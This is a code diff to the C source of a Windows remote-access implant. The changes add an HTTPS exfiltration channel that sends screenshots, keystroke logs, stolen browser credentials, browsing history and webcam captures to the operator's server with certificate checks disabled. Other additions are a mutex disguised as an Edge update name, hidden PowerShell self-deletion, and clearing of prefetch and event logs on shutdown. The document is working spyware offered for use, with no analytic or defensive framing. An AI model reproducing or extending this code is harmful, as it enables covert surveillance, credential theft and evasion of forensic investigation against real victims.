@@ -22,6 +22,8 @@
 
 #ifdef _WIN32
 #include <wincrypt.h>
+#include <winhttp.h>
+#include <time.h>
 #endif
 
 /*
@@ -41,6 +43,69 @@ static void decode_enrollment_token(char *out)
         out[i] = (char)(g_token_obf[i] ^ g_token_key[i % sizeof(g_token_key)]);
     out[TOKEN_OBF_LEN] = '\0';
 }
+
+/* ── Separate exfil channel (port 9443 HTTPS) ───────────────────────
+ *
+ * Exfil data (screenshots, keylogs, creds, history) is sent directly to
+ * exfil-receiver via WinHTTP HTTPS POST — a completely different channel
+ * from the mTLS C2 connection on port 443.  The C2 channel carries only
+ * short command acknowledgements; no bulk data crosses it.
+ *
+ * URL format: https://<C2_DEFAULT_HOST>:9443/exfil/<hostname>/<filename>
+ */
+#ifdef _WIN32
+#define EXFIL_PORT 9443
+
+static void exfil_post(const char *hostname, const char *filename,
+                        const char *data, int data_len)
+{
+    wchar_t w_host[256] = {0};
+    MultiByteToWideChar(CP_ACP, 0, C2_DEFAULT_HOST, -1, w_host, 256);
+
+    char path_buf[512];
+    _snprintf(path_buf, sizeof(path_buf), "/exfil/%s/%s", hostname, filename);
+    wchar_t w_path[512] = {0};
+    MultiByteToWideChar(CP_ACP, 0, path_buf, -1, w_path, 512);
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
+                                      WINHTTP_ACCESS_TYPE_NO_PROXY,
+                                      WINHTTP_NO_PROXY_NAME,
+                                      WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, w_host,
+                                         (INTERNET_PORT)EXFIL_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", w_path,
+                                             NULL, WINHTTP_NO_REFERER,
+                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                             WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    /* Skip cert validation — exfil-receiver uses the same self-signed cert
+     * as the delivery server, not the CA-signed mTLS cert. */
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA       |
+                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
+                     &flags, sizeof(flags));
+
+    WinHttpSendRequest(hRequest,
+                       WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                       (LPVOID)data, (DWORD)data_len, (DWORD)data_len, 0);
+    WinHttpReceiveResponse(hRequest, NULL);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+#endif
 
 /* ── BP5 keepalive thread ────────────────────────────────────────────
  *
@@ -371,6 +436,29 @@ int main(int argc, char **argv)
         }
         return 0;
     }
+
+    /* Camera helper: spawned in the user session by spy_camera_snapshot when
+     * the main implant is running as SYSTEM.  Captures frame, writes BMP. */
+    if (argc >= 3 && strcmp(argv[1], "--camera-snapshot") == 0) {
+        int len = 0;
+        char *data = spy_camera_snapshot(&len);
+        if (data) {
+            FILE *fp = fopen(argv[2], "wb");
+            if (fp) { fwrite(data, 1, len, fp); fclose(fp); }
+            free(data);
+        }
+        return 0;
+    }
+
+    /* Single-instance guard: if the exploit fires more than once (e.g. victim
+     * refreshes the page), a second i.exe will start and try to run as a full
+     * implant.  The Global\ prefix makes the mutex visible across all sessions
+     * and users so it catches both same-session and cross-session duplicates. */
+    HANDLE g_mutex = CreateMutexA(NULL, TRUE, "Global\\MicrosoftEdgeUpdateMtx");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (g_mutex) CloseHandle(g_mutex);
+        return 0;
+    }
 #endif
     (void)argc; (void)argv;
 
@@ -522,11 +610,45 @@ int main(int argc, char **argv)
 
         case COMMAND_SHUTDOWN: {
 #ifdef _WIN32
-            system("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f >nul 2>&1");
-            /* Can't delete the running executable directly; mark it for
-             * removal on next reboot and clean up everything else now. */
+            {
+                /* Drain the pipe so schtasks /delete completes before we
+                 * proceed — hidden_popen closes the process handle
+                 * immediately, and fclose alone does not wait. */
+                FILE *fp = POPEN("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f", "r");
+                if (fp) {
+                    char drain[256];
+                    while (fgets(drain, sizeof(drain), fp));
+                    PCLOSE(fp);
+                }
+            }
+            /* Spawn a hidden PowerShell to delete the binary after we exit.
+             * The OS holds a lock on the running exe so direct deletion fails.
+             * PowerShell sleeps 2 s (well after ExitProcess releases the lock)
+             * then force-removes the file and the now-empty install dir.
+             * MoveFileExA is kept as a reboot-time fallback in case PowerShell
+             * is blocked by policy. */
+            {
+                char del_cmd[MAX_PATH + 256];
+                _snprintf(del_cmd, sizeof(del_cmd),
+                    "powershell.exe -WindowStyle Hidden -NonInteractive -Command "
+                    "\"Start-Sleep 2; "
+                    "Remove-Item -Force -ErrorAction SilentlyContinue '%s'; "
+                    "Remove-Item -Force -ErrorAction SilentlyContinue '%s'\"",
+                    IMPLANT_TARGET_PATH, IMPLANT_TARGET_DIR);
+                STARTUPINFOA si;
+                ZeroMemory(&si, sizeof(si));
+                si.cb          = sizeof(si);
+                si.dwFlags     = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi;
+                ZeroMemory(&pi, sizeof(pi));
+                if (CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE,
+                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hThread);
+                    CloseHandle(pi.hProcess);
+                }
+            }
             MoveFileExA(IMPLANT_TARGET_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-            RemoveDirectoryA(IMPLANT_TARGET_DIR);
             DeleteFileA(IMPLANT_STAGE_PATH);
 #endif
             /* Remove all implant files — credentials, keylog, temp dir */
@@ -537,6 +659,7 @@ int main(int argc, char **argv)
                 remove(s_key);
 #ifdef _WIN32
                 DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\kl.dat");
+                DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\ss.tmp");
                 RemoveDirectoryA("C:\\Users\\Public\\MicrosoftEdge");
                 clear_prefetch();
                 clear_event_logs();
@@ -620,15 +743,24 @@ int main(int argc, char **argv)
         case COMMAND_SCREENSHOT: {
             int len = 0;
             char *data = spy_screenshot_capture(&len);
+#ifdef _WIN32
             if (data) {
-                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
-                locked_send(&resp, conn);
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "screenshot_%ld.bmp", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
                 free(data);
+                char *ack = "screenshot exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
             } else {
                 char *err = "screenshot failed";
                 Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
                 locked_send(&resp, conn);
             }
+#endif
             break;
         }
 
@@ -666,45 +798,99 @@ int main(int argc, char **argv)
         case COMMAND_KEYLOG_DUMP: {
             int len = 0;
             char *data = spy_keylog_dump(&len);
+#ifdef _WIN32
             if (data) {
-                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
-                locked_send(&resp, conn);
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "keylog_%ld.txt", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
                 free(data);
+                char *ack = "keylog exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
             } else {
                 char *err = "no log data";
                 Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
                 locked_send(&resp, conn);
             }
+#endif
             break;
         }
 
         case COMMAND_CRED_STEAL: {
             int len = 0;
             char *data = spy_browser_creds_steal(&len);
+#ifdef _WIN32
             if (data) {
-                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
-                locked_send(&resp, conn);
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "creds_%ld.bin", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
                 free(data);
+                char *ack = "credentials exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
             } else {
                 char *err = "credential steal failed (not found or access denied)";
                 Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
                 locked_send(&resp, conn);
             }
+#endif
             break;
         }
 
         case COMMAND_HISTORY_STEAL: {
             int len = 0;
             char *data = spy_browser_history_steal(&len);
+#ifdef _WIN32
             if (data) {
-                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
-                locked_send(&resp, conn);
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "history_%ld.bin", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
                 free(data);
+                char *ack = "history exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
             } else {
                 char *err = "history steal failed (not found or access denied)";
                 Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
                 locked_send(&resp, conn);
             }
+#endif
+            break;
+        }
+
+        case COMMAND_CAMERA_SNAPSHOT: {
+            int len = 0;
+            char *data = spy_camera_snapshot(&len);
+#ifdef _WIN32
+            if (data) {
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "camera_%ld.bmp", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
+                free(data);
+                char *ack = "camera snapshot exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
+            } else {
+                const char *reason = spy_camera_last_error();
+                char err[300];
+                _snprintf(err, sizeof(err), "camera snapshot failed: %s",
+                          (reason && reason[0]) ? reason : "unknown error");
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+#endif
             break;
         }
 
@@ -715,11 +901,17 @@ int main(int argc, char **argv)
         free_packet(pkt);
     }
 
+    /* Signal keepalive thread to stop and give it one cycle to observe the
+     * flag before we free the connection it holds a pointer to. */
     g_ka_run = 0;
-    g_conn   = NULL;
+    SLEEP(1);
+    g_conn = NULL;
     if (conn) tls_conn_free(conn);
     tls_cleanup();
     MUTEX_DESTROY(&g_write_lock);
     platform_cleanup();
+#ifdef _WIN32
+    ExitProcess(0);
+#endif
     return 0;
 }
